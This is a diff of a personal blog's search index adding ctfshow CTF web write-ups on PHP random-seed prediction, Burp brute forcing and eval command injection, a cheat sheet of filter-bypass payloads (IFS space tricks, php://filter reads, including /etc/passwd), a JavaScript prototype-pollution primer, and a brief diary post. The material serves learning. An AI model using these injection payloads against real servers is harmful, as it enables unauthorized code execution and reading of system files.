+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(seed);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>();</span><br></pre></td></tr></table></figure>
+<p>得</p>
+<p>448251818</p>
+<p>614468087</p>
+<p>Url/r=448251818  cookie=token=614468087</p>
+<p>ctfshow{3944ae31-389f-4695-92fb-7791162db256}</p>
+<h1><strong>Web26</strong></h1>
+<p>进去之后是个下载的什么什么的东西</p>
+<p>还有账号密码，应该是破解密码的</p>
+<p>Bp抓包爆破7758521</p>
+<p>ctfshow{9a82e93f-9eea-4340-8754-e2a1559f75cf</p>
+<h1><strong>Web27</strong></h1>
+<p>点击录取名单，有一个表格，那就从第一个人下手</p>
+<p>高先伊621022********5237</p>
+<p>很明显，这里需要bp暴力破解，注意抓post包</p>
+<p>发送给intruder</p>
+<p><img src="wps24.jpg" alt="img"></p>
+<p><img src="wps25.jpg" alt="img"></p>
+<p><img src="wps26.jpg" alt="img"></p>
+<p>02015237</p>
+<p>621022199002015237</p>
+<p>ctfshow{45f62eec-3f98-4f37-a99e-2e564ac70f4f}</p>
+<h1><strong>Web28</strong></h1>
+<p>爆破目录</p>
+<p><img src="wps27.jpg" alt="img"></p>
+<p>换成集束炸弹模式，选中1 2，并把后面的2.txt删掉，右边1和2都从0到100，出来后点状态码，然后点响应就可以了</p>
+<p><img src="wps28.jpg" alt="img"></p>
+<p>ctfshow{d70041f1-624c-4a40-88ae-1a720cbb9e35}</p>
+<h1>Web29</h1>
+<p><img src="wps29.jpg" alt="img"></p>
+<p>解释代码：</p>
+<p>error_reporting(0);这行代码用于关闭错误报告(和报错注入有关？我瞎猜的)，即不显示 PHP 运行过程中可能产生的错误信息。这样做可能是为了避免在某些情况下向用户暴露敏感信息，但在开发和调试阶段，通常不建议关闭错误报告，以便及时发现和解决问题。</p>
+<p>if(isset($_GET[‘c’])){：isset()函数用于检查变量是否已设置且非null。这里是检查$_GET超全局数组中是否存在键为’c’的元素。如果存在，就执行下面的代码块。</p>
+<p>$c = $_GET[‘c’];：将$_GET[‘c’]的值赋给变量$c，以便后续使用。</p>
+<p>if(!preg_match(“/flag/i”, $c)){：preg_match()函数用于执行正则表达式匹配。这里的正则表达式&quot;/flag/i&quot;表示不区分大小写地匹配字符串&quot;flag&quot;。!表示取反，即如果$c的值不包含（不区分大小写）“flag”，则执行下面的eval($c);语句。</p>
+<p>eval($c);：eval()函数会将传入的字符串作为 PHP 代码执行。这是一个非常强大但也很危险的函数，因为如果传入的字符串来自不可信的来源（例如用户输入），可能会导致安全漏洞，如代码注入攻击。</p>
+<p>总的来说：我们需要get一个命令，让它出现flag。然而，他又过滤了flag这四个字符，那怎么办？</p>
+<p>\1. 使用Linux通配符，我们可以这样构造payload：?c=system(‘cat f*’);或者?c=system(‘cat [f]*’);然后查看源码得到flag，或者抓包看到flag</p>
+<p>\2. ?c=system(“cat *.php&gt;&gt;1.txt”);把所有以php结尾的文件都写进一个txt</p>
+<p>ctfshow{cd997bb9-1ab7-48a7-819a-c5e9856aedc3}</p>
+<p>插入一点知识:</p>
+<p>\1.  ?c=phpinfo();当中的disable_functions</p>
+<p><img src="wps30.jpg" alt="img"></p>
+<p>后面没有任何的值，也就是说，这里没有禁用任何的函数。那么我们就可以使用system函数来输出flag</p>
+<p>\2.  ?c=system(‘ls’);看到有flag.php和index.php两个文件，那么我们想一想，能不能单独显示出来flag.php，然后前面加上一个cat？</p>
+<p>scandir(“.”)扫描当前目录，但没有回显</p>
+<p>套上一个print_r()函数就可以看到回显，最终?c=print_r(scandir(“.”));</p>
+<p>Array ( [0] =&gt; . [1] =&gt; … [2] =&gt; flag.php [3] =&gt; index.php )</p>
+<p>?c=print_r(scandir(“.”)[2]);输出flag.php</p>
+<p>那么，有了flag.php这个整体，那前面拼接一个cat是不是就可以了？</p>
+<p>知识有限，止步于此</p>
+<h1>Web30</h1>
+<p>shell_exec ()函数：shell_exec(‘ls -l’) 会执行 ls -l 系统命令</p>
+<p>反引号和shell_exec()函数同理</p>
+<p>?c=echo <code>cat f*</code>;看源码出flag</p>
+<p>?c=passthru(‘cat f*’);</p>
+<p>这里呢？哈哈哈哈，卢本伟：**</p>
+<p>万能办法&gt;&gt;和cp(复制，和&gt;&gt;差不多)用法cp flag.php 1.txt</p>
+<p>?c=echo <code>cat [f]*</code>;注意看源代码，你看你的软件，肯定没回显的</p>
+<p>?c=echo <code>cat [f]* &gt;&gt; 1.txt</code>;</p>
+<p>ctfshow{e6cce2cc-a5dc-4e88-ba65-3cc8d4620046}</p>
+<h1>总结21-30</h1>
+<p>1.bp当中的intruder为爆破部分</p>
+<p>2.自定义迭代器(Custom Iterator):可以自动替换测试，而且可以添加前后缀，结果可以通过base64等加密一下</p>
+<p>3.特定字符串内容一般abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789其中几个字符组成的，可以通过编写脚本得出需要的特定字符串</p>
+<p>4.伪随机数mt_srand()和mt_srand(seed);产生的随机数是固定的。seed为数字串</p>
+<p>5.intruder 当中有集束炸弹模式，可以选中多个部分进行爆破</p>
+<p>6.if(!preg_match(“/flag/i”, $c)){：preg_match()函数用于执行正则表达式匹配</p>
+<p>7.isset()函数用于检查变量是否已设置且非null。if(isset($_GET[‘c’])){</p>
+<p>8.eval()函数会将传入的字符串作为 PHP 代码执行</p>
+<p>9.error_reporting(0);这行代码用于关闭错误报告(和报错注入有关？我瞎猜的)</p>
+<p>10.Linux通配符:  cat * [] {} ?</p>
+<p>11.phpinfo();当中的disable_functions后面跟的值是禁用的函数</p>
+<p>12.?c=system(“cat *.php&gt;&gt;1.txt”);把所有php的内容写到txt里面</p>
+<p>13.scandir(“.”)表示扫描当前目录，一个点是当前目录，两个点是上级目录.套上一个print_r()函数就可以看到回显，最终?c=print_r(scandir(“.”));</p>
+<p>Array ( [0] =&gt; . [1] =&gt; … [2] =&gt; flag.php [3] =&gt; index.php )</p>
+<p>?c=print_r(scandir(“.”)[2]);输出flag.php</p>
+<p>那在前面拼接一个cat是不是可以拿到flag？</p>
+<p>14.shell_exec ()函数：shell_exec(‘ls -l’) 会执行 ls -l 系统命令.反引号和shell_exec()函数同理</p>
+<ol start="15">
+<li>?c=passthru(‘cat f*’);</li>
+</ol>
+<p>​		?c=echo cat [f]*;注意看源代码，你看你的软件，肯定没回显的</p>
+<p>​		?c=echo cat [f]* &gt;&gt; 1.txt;</p>
+<p>16.?c=eval($_GET[a]);&amp;a=system(‘cat flag.php’);</p>
+<p>代码解释：从get当中获取了一个超全局变量a，并使用eval函数将其作为php代码执行</p>
+<p>通过a来拿到flag，但这里似乎是在preg_match外运行的，不会受过滤的影响</p>
+<p>$符号可以类比java当中的int</p>
+<ol start="17">
+<li></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空格绕过</span><br><span class="line"></span><br><span class="line">%09 符号需要php环境</span><br><span class="line"></span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line"></span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line"></span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line"></span><br><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg</span><br><span class="line"></span><br><span class="line">(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br></pre></td></tr></table></figure>
+<ol start="18">
+<li></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat过滤</span><br><span class="line"></span><br><span class="line">more:一页一页的显示档案内容</span><br><span class="line"></span><br><span class="line">less:与 more 类似。但在用 more 时候可能不能向上翻页，不能向上搜索指定字符串，而 less 却可以自由的向上向下翻页，也可以自由的向上向下搜索指定字符串。</span><br><span class="line"></span><br><span class="line">head:查看头几行</span><br><span class="line"></span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line"></span><br><span class="line">tail:查看尾几行</span><br><span class="line"></span><br><span class="line">nl：命令的作用和 cat -n 类似，是将文件内容全部显示在屏幕上，并且是从第一行开始显示，同时会自动打印出行号。</span><br><span class="line"></span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line"></span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line"></span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line"></span><br><span class="line">sort:可以查看</span><br><span class="line"></span><br><span class="line">uniq:可以查看</span><br><span class="line"></span><br><span class="line">file -f:报错出具体内容。可以利用报错将文件内容带出来（-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。）</span><br></pre></td></tr></table></figure>
+<p>19…</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php无需括号的函数</span><br><span class="line"></span><br><span class="line">echo 123;</span><br><span class="line"></span><br><span class="line">print 123;</span><br><span class="line"></span><br><span class="line">die;</span><br><span class="line"></span><br><span class="line">include &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">例如?c=include&quot;$_GET[url]&quot;?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">或者?c=include%0a$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">require &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">include_once &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">require_once &quot;etc/passwd&quot;;</span><br></pre></td></tr></table></figure>
+<p>20.?&gt;符号相当于和前面的&lt;?php对应了，然后后面的代码会在空间外执行</p>
+]]></content>
+      <tags>
+        <tag>ctfshow_web_命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>原型链污染</title>
+    <url>/2025/03/16/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
+    <content><![CDATA[<p>似乎与ssti有相似的地方。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&#x27;pan&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = <span class="number">19</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">b = <span class="keyword">new</span> <span class="title function_">a</span>();</span><br><span class="line"><span class="keyword">if</span>(b.<span class="property">__proto__</span> == a.<span class="property"><span class="keyword">prototype</span></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;yes&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;no&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果为yes</span></span><br></pre></td></tr></table></figure>
+<h2 id="什么是原型链？">什么是原型链？</h2>
+<p>因为继承机制而产生的线性关系</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">__proto__</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">__proto__</span>.<span class="property">__proto__</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*运行结果</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">[Object: null prototype] &#123;&#125;</span></span><br><span class="line"><span class="comment">null</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<p>var的上层为{}，再上层就是Object，再往上就是null。null为链的末端。</p>
+<h2 id="继承机制">继承机制</h2>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&quot;ssz1&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = <span class="number">18</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">b</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&quot;ssz2&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置b的父类为a</span></span><br><span class="line">b.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title function_">a</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义c对象</span></span><br><span class="line">c = <span class="keyword">new</span> b;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`name:<span class="subst">$&#123;c.name&#125;</span> age:<span class="subst">$&#123;c.age&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*运行结果</span></span><br><span class="line"><span class="comment">name:ssz2 age:18</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<h2 id="看一个经典的递归漏洞思路">看一个经典的递归漏洞思路</h2>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//漏洞</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//漏洞</span></span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment">//要实现从JSON字符串转换为JS对象，使用 JSON.parse() 方法</span></span><br><span class="line"><span class="comment">//代码中的 __proto__ 是 o1 的上一层原型对象</span></span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"> </span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*运行结果</span></span><br><span class="line"><span class="comment">1 2</span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<p>merge(合并)函数解释：用于将source对象的属性合并到target对象中。如果属性是对象，则递归合并，否则直接覆盖或添加属性到target。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let target = &#123; a: 1, b: &#123; x: 2 &#125; &#125;;</span><br><span class="line">let source = &#123; b: &#123; y: 3 &#125;, c: 4 &#125;;</span><br><span class="line">merge(target, source); </span><br><span class="line">// 结果：&#123; a:1, b:&#123;x:2, y:3&#125;, c:4 &#125;</span><br></pre></td></tr></table></figure>
+<p><a href="https://zhuanlan.zhihu.com/p/690650551">原文</a></p>
+<p><a href="https://xz.aliyun.com/news/12518?time__1311=eqUxu7DtD%3DTND%2FD0Dd%3DitG8RACuWoD&amp;u_atoken=0d51e5d3cd115a0d879fb72d56b21eb7&amp;u_asig=0a47309317419553385443514e0086">python原型链污染</a></p>
+]]></content>
+      <tags>
+        <tag>原型链污染</tag>
+      </tags>
   </entry>
   <entry>
     <title>反序列化</title>
@@ -2873,5 +2867,12 @@ php://input用于执行php代码。</p>
       <tags>
         <tag>文件包含</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>搞砸了</title>
+    <url>/2024/12/12/%E6%90%9E%E7%A0%B8%E4%BA%86/</url>
+    <content><![CDATA[<p>听三百遍反方向的钟，让我回去吧。 给23.12.17下午那个傻孩子一巴掌，全搞砸了</p>
+<p><img src="image-20250122014041713.png" alt="image-20250122014041713"></p>
+]]></content>
   </entry>
 </search>
